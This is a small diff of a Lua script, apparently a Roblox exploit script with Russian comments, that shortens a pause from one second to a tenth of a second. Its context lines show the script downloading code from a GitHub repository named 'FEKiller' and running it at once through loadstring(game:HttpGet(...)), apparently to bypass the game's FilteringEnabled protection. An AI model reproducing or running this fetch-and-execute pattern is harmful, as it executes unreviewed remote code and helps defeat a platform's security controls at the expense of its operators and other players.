@@ -402,7 +402,7 @@ local function C_24()
 	    local character = player.Character or player.CharacterAdded:Wait()	
 	    player.CharacterAdded:Wait() -- дополнительная гарантия	
 	    	
-	    task.wait(1) -- небольшая пауза	
+	    task.wait(0.1) -- небольшая пауза	
 	    	
 	    local success, err = pcall(function()	
 	        loadstring(game:HttpGet("https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"))()	
